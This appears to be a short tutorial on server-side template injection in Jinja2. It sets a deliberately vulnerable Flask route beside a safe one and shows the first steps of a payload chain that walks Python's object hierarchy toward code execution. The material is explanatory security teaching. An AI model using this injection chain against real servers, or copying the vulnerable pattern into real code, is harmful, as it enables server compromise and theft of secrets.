What Are Template Engines?

Template engines allow developers to embed dynamic content in HTML pages. They use special syntax to insert variables, run loops, and execute logic. Popular engines include:

Jinja2Python{{ expr }}{# comment #}
TwigPHP{{ expr }}{# comment #}

How SSTI Occurs

SSTI happens when user input is concatenated directly into a template string before rendering, rather than being passed as a safe variable:

Vulnerable Code

from flask import Flask, request, render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # DANGEROUS: user input becomes part of the template itself
    template = f"Hello {name}! Welcome to our site."
    return render_template_string(template)

Safe Code

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # SAFE: user input passed as a variable to render
    return render_template_string("Hello {{ name }}!", name=name)

Jinja2 Exploitation Chain

Once you confirm Jinja2 SSTI, you can traverse Python's object hierarchy to access powerful classes:

# Step 1: Access the string class
{{ ''.__class__ }}
# → <class 'str'>

# Step 2: Traverse to the base object
{{ ''.__class__.__mro__ }}
# → (<class 'str'>, <class 'object'>)

# Step 3: List all subclasses of object
{{ ''.__class__.__mro__[1].__subclasses__() }}
# → [<class 'type'>, <class 'weakref'>, ... hundreds of classes]

# Step 4: Find useful classes (like subprocess, file readers)
# and use them for RCE or file read
Impact: Successful SSTI can lead to Remote Code Execution (RCE), reading sensitive files, extracting environment variables and secrets, and full server compromise.
